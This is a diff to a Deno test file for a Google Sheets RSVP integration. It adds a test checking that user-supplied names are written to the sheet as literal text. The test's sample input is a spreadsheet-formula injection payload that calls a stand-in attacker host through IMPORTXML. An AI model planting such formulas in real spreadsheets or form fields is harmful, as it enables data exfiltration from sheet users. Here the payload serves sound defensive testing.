@@ -1,4 +1,8 @@
-import { GoogleSheetsError, readContingencyRows } from "./google-sheets.ts";
+import {
+  appendContingencyRsvp,
+  GoogleSheetsError,
+  readContingencyRows,
+} from "./google-sheets.ts";
 
 function assertEquals<T>(actual: T, expected: T, message: string): void {
   if (actual !== expected) {
@@ -6,31 +10,36 @@ function assertEquals<T>(actual: T, expected: T, message: string): void {
   }
 }
 
+async function createSyntheticServiceAccount(): Promise<string> {
+  const keyPair = await crypto.subtle.generateKey(
+    {
+      name: "RSASSA-PKCS1-v1_5",
+      modulusLength: 2048,
+      publicExponent: new Uint8Array([1, 0, 1]),
+      hash: "SHA-256",
+    },
+    true,
+    ["sign", "verify"],
+  );
+  const privateKey = new Uint8Array(
+    await crypto.subtle.exportKey("pkcs8", keyPair.privateKey),
+  );
+  const privateKeyBase64 = btoa(String.fromCharCode(...privateKey));
+  const privateKeyPem = `-----BEGIN PRIVATE KEY-----\n${
+    privateKeyBase64.match(/.{1,64}/g)?.join("\n")
+  }\n-----END PRIVATE KEY-----`;
+
+  return btoa(JSON.stringify({
+    client_email: "synthetic@example.invalid",
+    private_key: privateKeyPem,
+  }));
+}
+
 Deno.test({
   name: "contingency reader accepts presence as attendance header",
   permissions: "inherit",
   fn: async () => {
-    const keyPair = await crypto.subtle.generateKey(
-      {
-        name: "RSASSA-PKCS1-v1_5",
-        modulusLength: 2048,
-        publicExponent: new Uint8Array([1, 0, 1]),
-        hash: "SHA-256",
-      },
-      true,
-      ["sign", "verify"],
-    );
-    const privateKey = new Uint8Array(
-      await crypto.subtle.exportKey("pkcs8", keyPair.privateKey),
-    );
-    const privateKeyBase64 = btoa(String.fromCharCode(...privateKey));
-    const privateKeyPem = `-----BEGIN PRIVATE KEY-----\n${
-      privateKeyBase64.match(/.{1,64}/g)?.join("\n")
-    }\n-----END PRIVATE KEY-----`;
-    const serviceAccount = btoa(JSON.stringify({
-      client_email: "synthetic@example.invalid",
-      private_key: privateKeyPem,
-    }));
+    const serviceAccount = await createSyntheticServiceAccount();
     const previousFetch = globalThis.fetch;
     const previousServiceAccount = Deno.env.get(
       "GOOGLE_SERVICE_ACCOUNT_JSON_B64",
@@ -116,6 +125,76 @@ Deno.test({
           "Duplicate attendance aliases should be identified",
         );
       }
+    } finally {
+      globalThis.fetch = previousFetch;
+      if (previousServiceAccount === undefined) {
+        Deno.env.delete("GOOGLE_SERVICE_ACCOUNT_JSON_B64");
+      } else {
+        Deno.env.set("GOOGLE_SERVICE_ACCOUNT_JSON_B64", previousServiceAccount);
+      }
+      if (previousSpreadsheetId === undefined) {
+        Deno.env.delete("GOOGLE_SPREADSHEET_ID");
+      } else {
+        Deno.env.set("GOOGLE_SPREADSHEET_ID", previousSpreadsheetId);
+      }
+    }
+  },
+});
+
+Deno.test({
+  name: "contingency append stores user values as literal cell data",
+  permissions: "inherit",
+  fn: async () => {
+    const previousFetch = globalThis.fetch;
+    const previousServiceAccount = Deno.env.get(
+      "GOOGLE_SERVICE_ACCOUNT_JSON_B64",
+    );
+    const previousSpreadsheetId = Deno.env.get("GOOGLE_SPREADSHEET_ID");
+    let appendRequestUrl = "";
+    let appendRequestBody = "";
+
+    Deno.env.set(
+      "GOOGLE_SERVICE_ACCOUNT_JSON_B64",
+      await createSyntheticServiceAccount(),
+    );
+    Deno.env.set("GOOGLE_SPREADSHEET_ID", "synthetic-spreadsheet-id");
+    globalThis.fetch = (input, init) => {
+      const url = String(input);
+      if (url.startsWith("https://oauth2.googleapis.com/token")) {
+        return Promise.resolve(
+          Response.json({ access_token: "synthetic-access-token" }),
+        );
+      }
+
+      appendRequestUrl = url;
+      appendRequestBody = String(init?.body);
+      return Promise.resolve(new Response(null, { status: 200 }));
+    };
+
+    try {
+      const formulaLikeName = '=IMPORTXML("https://attacker.invalid","//data")';
+      await appendContingencyRsvp({
+        request_id: "f8c06c53-1c6b-4c6c-9acd-cdbb1451541a",
+        created_at: "2026-10-07T12:00:00.000Z",
+        name: formulaLikeName,
+        email: "synthetic@example.invalid",
+        attendance: true,
+        companions: 0,
+        status: "pending",
+        error_type: "synthetic_test",
+        synced_at: "",
+      });
+
+      assertEquals(
+        new URL(appendRequestUrl).searchParams.get("valueInputOption"),
+        "RAW",
+        "Untrusted RSVP data must not be interpreted as formulas",
+      );
+      assertEquals(
+        (JSON.parse(appendRequestBody) as { values: string[][] }).values[0][2],
+        formulaLikeName,
+        "Formula-like names should be preserved literally",
+      );
     } finally {
       globalThis.fetch = previousFetch;
       if (previousServiceAccount === undefined) {
